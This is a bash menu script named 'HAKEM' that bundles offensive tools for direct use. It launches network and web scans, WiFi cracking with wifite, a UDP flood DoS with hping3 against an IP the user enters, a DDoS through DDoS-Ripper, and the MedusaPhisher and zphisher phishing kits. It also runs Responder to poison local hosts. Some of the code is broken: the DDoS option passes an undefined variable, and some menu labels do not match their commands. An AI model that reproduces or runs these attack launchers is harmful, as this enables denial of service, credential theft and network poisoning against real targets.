#!/bin/bash

# Requirements:
# lolcat
# figlet
# nmap
# netdiscover
# above
# dirbuster
# whois
# ddos-ripper
# python3
# phonextract
# sparrow-wifi
# wireshark
# medusaphisher
# zphisher
# responder
# cowsay

# Directory Fix
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
cd "$SCRIPT_DIR"

# Color Codes
RED='\033[0;31m'
GREEN='\033[0;32m'
GREENL='\033[0;92m'
BLUE='\033[0;34m'
BLUEL='\033[0;94m'
BLUEL_BOLD='\033[1;94m'
BLUE_BOLD='\033[1;34m'
NC='\033[0m' # No Color (Reset)

# Interface Auto Detect
INTERFACE=$(ip route | grep default | awk '{print $5}' | head -n 1)

if [ -z "$INTERFACE" ]; then
        echo "${RED}Error: No active network interface with a default route found.${NC}"
        exit 1
fi

FULL_IP=$(ip addr show "$INTERFACE" | grep -w inet | awk '{print $2}' | head -n 1)

if [ -z "$FULL_IP" ]; then
        echo "${RED}Error: No IP address found on interface $INTERFACE.${NC}"
        exit 1
fi

# Store Network IP to Nmap Format
NETWORK_RANGE=$(echo "$FULL_IP" | sed 's/\.[0-9]*\//.0\//')

MY_IP=$(echo "$FULL_IP" | cut -d'/' -f1)
clear

# Internet Connection Check
clear
while true; do
        ping -c 1 8.8.8.8 >/dev/null 2>&1 && break
        echo -e "${RED}No Internet. Connect to Internet to Begin...${NC}"
        sleep 5
done

# Loop
clear
while true; do

        # Menu Selection
        clear
        echo ""
        figlet -f slant "HAKEM" | lolcat -S 40
        echo -e "${BLUE_BOLD}Made By 2bc705e2${NC}"
        echo ""
        echo ""
        echo ""
        echo ""
        echo -e "${BLUEL}[1] WiFi Host Scan ${NC}"
        echo -e "${BLUEL}[2] WiFi Port Scan ${NC}"
        echo -e "${BLUEL}[3] WiFi Host Vulnerability Scan ${NC}"
        echo -e "${BLUEL}[4] Website Directory Bruteforce ${NC}"
        echo -e "${BLUEL}[5] Website HTML Grabber ${NC}"
        echo -e "${BLUEL}[6] Website Whois ${NC}"
        echo -e "${BLUEL}[7] WiFi Bruteforce ${NC}"
        echo -e "${BLUEL}[8] DoS ${NC}"
        echo -e "${BLUEL}[9] DDoS ${NC}"
        echo -e "${BLUEL}[10] Phone Number OSINT ${NC}"
        echo -e "${BLUEL}[11] Packet Monitoring ${NC}"
        echo -e "${BLUEL}[12] Analyze Nearby WiFi Networks ${NC}"
        echo -e "${BLUEL}[13] QR Code Phish ${NC}"
        echo -e "${BLUEL}[14] Link Phish ${NC}"
        echo -e "${BLUEL}[15] Automatic WiFi Host Poisoner ${NC}"
        echo -e "${BLUE}[99] EXIT ${NC}"


        # Number Selection
        USER=$(whoami)

        echo ""
        echo ""
        echo -e "${GREENL}┌──(${BLUEL_BOLD}${USER}㉿HAKEM${NC}${NC}${GREENL})-[${NC}~${GREENL}]${NC}"
        PROMPT=$(printf "${GREENL}└─${NC}${BLUEL_BOLD}\$ ${NC}")

        read -e -p "$PROMPT" ANSWER

        # Selection Menu Options
        clear
        if [ "$ANSWER" -eq 1 ]; then
                clear
                echo -e "${GREENL}Press ENTER to Begin...${NC}"
                read -p ""
                clear
                sudo netdiscover -i "$INTERFACE"
                echo ""
                echo -e "${GREENL}Press ENTER to Go Back...${NC}"
                read -p ""
                sleep 2
                break

        elif [ "$ANSWER" -eq 2 ]; then
                clear
                echo -e "${GREENL}Press ENTER to Begin...${NC}"
                read -p ""
                clear
                nmap -sn "$NETWORK_RANGE" --exclude "$MY_IP"
                echo ""
                echo -e "${GREENL}Press ENTER to Go Back...${NC}"
                read -p ""
                sleep 2
                break

        elif [ "$ANSWER" -eq 3 ]; then
                clear
                echo -e "${GREENL}Press ENTER to Begin...${NC}"
                read -p ""
                clear
                sudo above --interface "$INTERFACE"
                echo ""
                echo -e "${GREENL}Press ENTER to Go Back...${NC}"
                read -p ""
                sleep 2
                break

        elif [ "$ANSWER" -eq 4 ]; then
                clear
                echo -e "${GREENL}Press ENTER to Begin...${NC}"
                read -p ""
                clear
                read -p "Enter Website (http://example.com): " DIRB_WEBSITE
                clear
                dirb "$DIRB_WEBSITE"
                echo ""
                echo -e "${GREENL}Press ENTER to Go Back...${NC}"
                read -p ""
                sleep 2
                break

        elif [ "$ANSWER" -eq 5 ]; then
                clear
                echo -e "${GREENL}Press ENTER to Begin...${NC}"
                read -p ""
                clear
                read -p "Enter Website (http://example.com:) " HTML_GRAB_WEBSITE
                curl "$HTML_GRAB_WEBSITE" | less
                echo ""
                echo -e "${GREENL}Press ENTER to Go Back...${NC}"
                read -p ""
                sleep 2
                break

        elif [ "$ANSWER" -eq 6 ]; then
                clear
                echo -e "${GREENL}Press ENTER to Begin...${NC}"
                read -p ""
                clear
                read -p "Enter Website (example.com): " WHOIS_WEBSITE
                whois "$WHOIS_WEBSITE"
                echo ""
                echo -e "${GREENL}Press ENTER to Go Back...${NC}"
                read -p ""
                sleep 2
                break

        elif [ "$ANSWER" -eq 7 ]; then
                clear
                echo -e "${GREENL}Press ENTER to Begin...${NC}"
                read -p ""
                clear
                sudo wifite
                echo ""
                echo -e "${GREENL}Press ENTER to Go Back...${NC}"
                read -p ""
                sleep 2
                break

        elif [ "$ANSWER" -eq 8 ]; then
                clear
                echo -e "${GREENL}Press ENTER to Begin...${NC}"
                read -p ""
                clear
                read -p "Enter IP Address (192.168.X.X): " DOS_IP
                read -p "Enter Port (22, 53, 80, 123, 135, 161, 162, 1900, 5353, 11211): " DOS_PORT
                sudo hping3 --udp --flood --destport "$DOS_PORT" "$DOS_IP"
                echo ""
                echo -e "${GREENL}Press ENTER to Go Back...${NC}"
                read -p ""
                sleep 2
                break

        elif [ "$ANSWER" -eq 9 ]; then
                clear
                echo -e "${GREENL}Press ENTER to Begin...${NC}"
                read -p ""
                clear
                cd DDoS-Ripper
                read -p "Enter Website (http://example.com): " DDOS_WEBSITE
                read -p "Enter Website Port (80 or 443): " DDOS_WEBSITE_PORT
                hostname=$(echo "$DDOS_WEBSITE" | sed -e 's|http[s]*://||' -e 's|/.*||')
                DDOS_WEBSITE_IP=$(dig +short "$DDOS_IP" | head -1)
                python3 DRipper.py -s "$DDOS_IP" -p "$DDOS_WEBSITE_PORT"
                cd HAKEM
                echo ""
                echo -e "${GREENL}Press ENTER to Go Back...${NC}"
                read -p ""
                sleep 2
                break

        elif [ "$ANSWER" -eq 10 ]; then
                clear
                echo -e "${GREENL}Press ENTER to Begin...${NC}"
                read -p ""
                clear
                cd phonextract
                python3 phonextract.py
                cd HAKEM
                echo ""
                echo -e "${GREENL}Press ENTER to Go Back...${NC}"
                read -p ""
                sleep 2
                break

        elif [ "$ANSWER" -eq 11 ]; then
                clear
                echo -e "${GREENL}Press ENTER to Begin...${NC}"
                read -p ""
                clear
                sudo wireshark -i "$INTERFACE"
                echo ""
                echo -e "${GREENL}Press ENTER to Go Back...${NC}"
                read -p ""
                sleep 2
                break

        elif [ "$ANSWER" -eq 12 ]; then
                clear
                echo -e "${GREENL}Press ENTER to Begin...${NC}"
                read -p ""
                clear
                sudo sparrow-wifi
                echo ""
                echo -e "${GREENL}Press ENTER to Go Back...${NC}"
                read -p ""
                sleep 2
                break

        elif [ "$ANSWER" -eq 13 ]; then
                clear
                echo -e "${GREENL}Press ENTER to Begin...${NC}"
                read -p ""
                clear
                cd MedusaPhisher
                chmod +x *
                ./setup.sh
                ./medusaphisher.sh
                cd HAKEM
                echo ""
                echo -e "${GREENL}Press ENTER to Go Back...${NC}"
                read -p ""
                sleep 2
                break

        elif [ "$ANSWER" -eq 14 ]; then
                clear
                echo -e "${GREENL}Press ENTER to Begin...${NC}"
                read -p ""
                clear
                cd zphisher
                chmod +x zphisher.sh
                ./zphisher.sh
                cd HAKEM
                echo ""
                echo -e "${GREENL}Press ENTER to Go Back...${NC}"
                read -p ""
                sleep 2
                break

        elif [ "$ANSWER" -eq 15 ]; then
                clear
                echo -e "${GREENL}Press ENTER to Begin...${NC}"
                read -p ""
                clear
                sudo responder -I "$INTERFACE" -v
                echo ""
                echo -e "${GREENL}Press ENTER to Go Back...${NC}"
                read -p ""
                sleep 2
                break
        fi
done

show_help() {
        echo "Usage: hakem [OPTIONS]"
        echo ""
        echo "Options:"
        echo "  -h          Show this help message"
        echo ""
        echo "Run This Before Using Tool:"
        echo "$ chmod +x *"
        echo "$ ./requirements.sh"
        echo ""
        cowsay "Have Fun."
}
 
